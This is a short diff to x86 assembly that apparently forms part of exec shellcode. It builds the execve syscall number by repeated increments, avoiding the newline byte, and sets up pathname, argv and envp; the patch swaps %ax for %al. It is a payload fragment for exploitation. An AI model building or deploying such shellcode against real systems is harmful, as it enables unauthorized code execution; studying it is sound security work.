@@ -19,17 +19,17 @@
 	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
 	/* use a left shift to avoid the unlink syscall number - newline */
-	xorb	%ax,%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax
-	inc	%ax			/* syscall arg 1: syscall number */
+	xorb	%al,%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al
+	inc	%al			/* syscall arg 1: syscall number */
 	movl	%esi,%ebx		/* syscall arg 2: string pathname */
 	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
 	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
